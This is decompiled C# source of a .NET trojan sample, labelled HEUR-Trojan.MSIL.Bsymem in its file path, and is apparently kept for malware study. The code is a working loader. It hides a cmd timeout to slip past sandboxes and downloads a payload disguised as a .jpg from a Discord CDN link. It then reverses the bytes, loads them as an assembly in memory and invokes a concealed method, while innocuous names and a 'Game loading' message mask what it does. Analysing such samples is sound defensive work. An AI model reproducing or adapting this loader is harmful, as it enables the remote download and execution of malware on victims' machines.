// Decompiled with JetBrains decompiler
// Type: Vgrbrre.PagePredicateFilter
// Assembly: Kylfopok, Version=91.0.4472.124, Culture=neutral, PublicKeyToken=null
// MVID: CCA23705-C75B-4EF2-8FB9-6F506484056A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Bsymem.gen-d3b115b4559e292ea22f8510c1eaed8749aed69d5d5a865db8159cac6d69d399.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;

namespace Vgrbrre
{
  internal class PagePredicateFilter
  {
    [STAThread]
    private static void Main()
    {
      // ISSUE: reference to a compiler-generated method
      PagePredicateFilter.ConcatTest(new PagePredicateFilter.RuleInterceptorPool());
      PagePredicateFilter.CustomizeTest();
      PagePredicateFilter.DeleteTest();
      PagePredicateFilter.InstantiateTest();
    }

    private static void CustomizeTest()
    {
      // ISSUE: reference to a compiler-generated method
      if (PagePredicateFilter.SortTest() == null)
        return;
      // ISSUE: reference to a compiler-generated method
      Assembly.Load(PagePredicateFilter.SortTest().CallTest().ToArray());
    }

    private static void DeleteTest()
    {
      // ISSUE: reference to a compiler-generated method
      if (PagePredicateFilter.SortTest().PopTest() > 0)
        return;
      foreach (Assembly assembly in Thread.GetDomain().GetAssemblies())
      {
        foreach (Type type in assembly.GetTypes())
        {
          foreach (MemberInfo member in type.GetMembers())
          {
            try
            {
              // ISSUE: reference to a compiler-generated method
              PagePredicateFilter.SortTest().DisableTest((int) type.InvokeMember("Epmcpwhgsstlwg", BindingFlags.InvokeMethod, (Binder) null, (object) null, (object[]) null));
            }
            catch
            {
            }
          }
        }
      }
    }

    private static void InstantiateTest() => Console.WriteLine(string.Format("Game loading {0}", (object) PagePredicateFilter.SortTest().PopTest()));

    private class RuleInterceptorPool
    {
      [CompilerGenerated]
      [SpecialName]
      internal int PopTest() => this._Model;

      [CompilerGenerated]
      [SpecialName]
      internal void DisableTest(int version_def) => this._Model = version_def;

      internal RuleInterceptorPool() => Process.Start(new ProcessStartInfo()
      {
        FileName = "cmd",
        Arguments = "/c timeout 19",
        WindowStyle = ProcessWindowStyle.Hidden
      }).WaitForExit();

      internal List<byte> CallTest()
      {
        try
        {
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        }
        catch
        {
        }
        List<byte> byteList = new List<byte>();
        byteList.AddRange((IEnumerable<byte>) new BinaryReader(WebRequest.Create("https://cdn.discordapp.com/attachments/948139449735319636/948922425666592768/Kylfopok.jpg").GetResponse().GetResponseStream()).ReadBytes(87998207));
        byteList.Reverse();
        return byteList;
      }
    }
  }
}
